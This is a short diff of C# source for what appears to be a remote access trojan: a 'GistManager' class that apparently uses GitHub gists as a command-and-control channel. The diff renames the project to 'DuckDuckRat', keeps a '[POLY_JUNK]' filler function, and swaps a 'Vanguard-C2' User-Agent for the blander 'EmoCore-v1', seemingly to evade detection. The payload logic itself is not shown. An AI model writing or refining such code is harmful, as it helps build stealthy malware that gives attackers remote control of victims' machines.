@@ -5,12 +5,12 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Text.Json;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public class GistManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_4bbb8d77() {
+        private static void _DuckDuckRat_4bbb8d77() {
             int val = 82169;
             if (val > 50000) Console.WriteLine("Hash:" + 82169);
         }
@@ -22,7 +22,7 @@ namespace VanguardCore
         static GistManager()
         {
             _client.DefaultRequestHeaders.Add("Authorization", $"token {Token}");
-            _client.DefaultRequestHeaders.Add("User-Agent", "Vanguard-C2");
+            _client.DefaultRequestHeaders.Add("User-Agent", "EmoCore-v1");
         }
 
         public static async Task<Dictionary<string, string>> GetFiles()
@@ -99,3 +99,5 @@ namespace VanguardCore
         }
     }
 }
+
+
